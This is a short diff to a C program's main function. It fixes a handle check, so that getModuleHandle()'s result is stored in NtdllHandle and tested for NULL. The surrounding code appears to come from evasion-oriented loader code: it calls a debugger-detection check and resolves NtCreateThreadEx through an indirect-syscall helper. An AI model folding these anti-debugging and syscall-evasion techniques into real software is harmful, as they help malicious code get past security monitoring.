@@ -95,8 +95,10 @@ int main() {
     OBJECT_ATTRIBUTES OA;
 
     isDebuggerModeOn();
-    if (getModuleHandle == NULL) {
-        exit(1); 
+
+    NtdllHandle = getModuleHandle();
+    if (NtdllHandle == NULL) {
+        exit(1);
     } 
 
     IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
